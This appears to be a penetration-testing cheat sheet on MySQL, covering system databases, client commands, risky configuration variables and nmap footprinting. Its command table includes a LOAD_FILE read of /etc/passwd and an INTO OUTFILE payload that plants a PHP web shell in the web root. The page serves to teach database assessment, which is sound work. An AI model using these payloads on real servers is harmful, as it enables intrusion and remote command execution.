# MySQL

## About

<mark style="color:red;">**MySQL**</mark> is an open-source SQL <mark style="color:purple;">**relational database**</mark> management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. Default MySQL port is <mark style="color:yellow;">**3306**</mark>. The most important databases fot the MySQL are the <mark style="color:green;">**`system schema (sys)`**</mark> and <mark style="color:green;">**`information schema (information_schema)`**</mark>. The **system schema** contaions tables, information, and metadata necessary for management. The **information schema** contains metadata which mainly retrieved from the system **schema database**.

## Databases

**MySQL** has default system databases that can help us understand the structure of all the databases that may be hosted on a target server.

| Database                                                   | Description                                                           |
| ---------------------------------------------------------- | --------------------------------------------------------------------- |
| <mark style="color:green;">**`mysql`**</mark>              | Contains tables with required info for the server                     |
| <mark style="color:green;">**`information_schema`**</mark> | Database metadata                                                     |
| <mark style="color:green;">**`performance_schema`**</mark> | Low level monitoring MySQL Server execution                           |
| <mark style="color:green;">**`sys`**</mark>                | Objects that helps devs to use data from performance\_schema database |

## MySQL Useful Commands

| Command                                                                                                                                                             | Description                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| <mark style="color:green;">**`mysql -u <user> -p<password> -h <IP address>`**</mark>                                                                                | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| <mark style="color:green;">**`show databases;`**</mark>                                                                                                             | Show all databases                                                                                    |
| <mark style="color:green;">**`use <database>;`**</mark>                                                                                                             | Select one of the existing databases                                                                  |
| <mark style="color:green;">**`show tables;`**</mark>                                                                                                                | Show all available tables in the selected database                                                    |
| <mark style="color:green;">**`show columns from <table>;`**</mark>                                                                                                  | Show all columns in the selected database                                                             |
| <mark style="color:green;">**`select * from <table>;`**</mark>                                                                                                      | Show everything in the desired table                                                                  |
| <mark style="color:green;">**`select * from <table> where <column> = "<string>";`**</mark>                                                                          | Search for needed `string` in the desired table                                                       |
| <mark style="color:green;">**`select LOAD_FILE("/etc/passwd");`**</mark>                                                                                            | _<mark style="color:orange;">**NOT DEFAULT.**</mark>_ Reading local files                             |
| <p></p><pre class="language-sql"><code class="lang-sql">SELECT "&#x3C;?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
</code></pre> | _<mark style="color:orange;">**NOT DEFAULT.**</mark>_ Writing local files                             |

## CMD Interacting

#### Linux

```bash
mysql -u carni17 -psuperkek123 -h 13.13.13.13
```

#### Windows

```bash
mysql.exe -u carni17 -psuperkek123 -h 13.13.13.13
```

## Dangerous Settings

#### **Config File Location**

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

* <mark style="color:green;">**`user`**</mark> - Sets which user the MySQL service will run as
* <mark style="color:green;">**`password`**</mark> - Sets the password for the MySQL user
* <mark style="color:green;">**`admin_address`**</mark> - The IP address on which to listen for TCP/IP connections on the administrative network interface
* <mark style="color:green;">**`debug`**</mark> - This variable indicates the current debugging settings
* <mark style="color:green;">**`sql_warnings`**</mark> - This variable controls whether single-row INSERT statements produce an information string if warnings occur
* <mark style="color:green;">**`secure_file_priv`**</mark> - This variable is used to limit the effect of data import and export operations. If empty - variable have no effect. If NULL - server disables import/export. If directory - import/export is limited to directory.

#### Show variable

```sql
show variables like "secure_file_priv";
```



## Tips2Hack

1. Nmap Basic Footprinting

```bash
sudo nmap 13.13.13.13 -sV -sC -p3306 --script mysql*
```

***
